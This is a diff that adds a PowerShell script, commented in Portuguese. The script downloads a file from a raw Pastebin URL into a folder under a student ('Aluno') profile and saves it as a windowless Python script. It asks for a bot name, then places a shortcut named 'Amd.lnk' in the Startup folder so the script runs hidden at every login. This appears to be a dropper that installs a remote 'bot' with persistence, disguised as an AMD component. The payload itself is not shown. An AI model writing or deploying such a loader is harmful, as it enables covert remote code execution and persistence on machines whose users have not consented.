@@ -1,0 +1,88 @@
+# Define variáveis
+$basePath = "C:\Users\Aluno"
+$zirulaPath = Join-Path $basePath "zirula"
+
+# URLs para baixar
+$urls = @(
+    "https://pastebin.com/raw/PXg2vRyW"
+)
+
+# Cria a pasta zirula se não existir
+if (-not (Test-Path $zirulaPath)) {
+    Write-Host "Criando pasta $zirulaPath"
+    New-Item -ItemType Directory -Path $zirulaPath -Force | Out-Null
+}
+
+# Função para baixar arquivos
+function Baixar-Arquivo($url, $destino) {
+    try {
+        Write-Host "Baixando $url ..."
+        Invoke-WebRequest -Uri $url -OutFile $destino -UseBasicParsing
+        Write-Host "Arquivo salvo em $destino"
+    }
+    catch {
+        Write-Warning "Falha ao baixar $url : $_"
+    }
+}
+
+# Baixa os arquivos para a pasta zirula
+foreach ($url in $urls) {
+    # Força nome do arquivo como main.py (pq é essa url específica)
+    $fileName = "main.pyw"
+    $destino = Join-Path $zirulaPath $fileName
+    Baixar-Arquivo -url $url -destino $destino
+}
+
+# Verifica existência do arquivo bot.txt
+$botFileUser = Join-Path $basePath "bot.txt"
+$botFileZirula = Join-Path $zirulaPath "bot.txt"
+
+if (-not (Test-Path $botFileUser) -and -not (Test-Path $botFileZirula)) {
+    # Solicita input do usuário
+    $botName = Read-Host "Arquivo bot.txt não encontrado. Por favor, digite o nome do bot"
+
+    # Cria o arquivo bot.txt dentro da pasta zirula
+    try {
+        cmd /c "echo $botName > `"$botFileZirula`""
+        Write-Host "Arquivo bot.txt criado em $botFileZirula com o conteúdo: $botName"
+    }
+    catch {
+        Write-Warning "Erro ao criar bot.txt: $_"
+    }
+}
+else {
+    Write-Host "Arquivo bot.txt já existe em $botFileUser ou $botFileZirula"
+}
+
+$batFilePath = Join-Path $zirulaPath "Amd.bat"
+
+try {
+    Set-Content -Path $batFilePath -Value "python main.pyw" -Encoding ASCII
+    Write-Host "Arquivo Amd.bat criado em $batFilePath"
+}
+catch {
+    Write-Warning "Erro ao criar Amd.bat: $_"
+}
+
+
+# Caminho do Amd.bat
+$batFilePath = Join-Path $zirulaPath "Amd.bat"
+
+# Caminho da pasta de inicialização do usuário
+$startupPath = [Environment]::GetFolderPath("Startup")
+
+$pythonw = "pythonw.exe"  # ou caminho completo, ex: C:\PythonXX\pythonw.exe
+$scriptPath = Join-Path $zirulaPath "main.pyw"
+$startupPath = [Environment]::GetFolderPath("Startup")
+$shortcutPath = Join-Path $startupPath "Amd.lnk"
+
+$WshShell = New-Object -ComObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $pythonw
+$shortcut.Arguments = "`"$scriptPath`""
+$shortcut.WorkingDirectory = $zirulaPath
+$shortcut.Save()
+
+Write-Host "Atalho Amd.lnk criado diretamente para pythonw.exe"
+
+Write-Host "Atalho Amd.lnk criado em $startupPath"
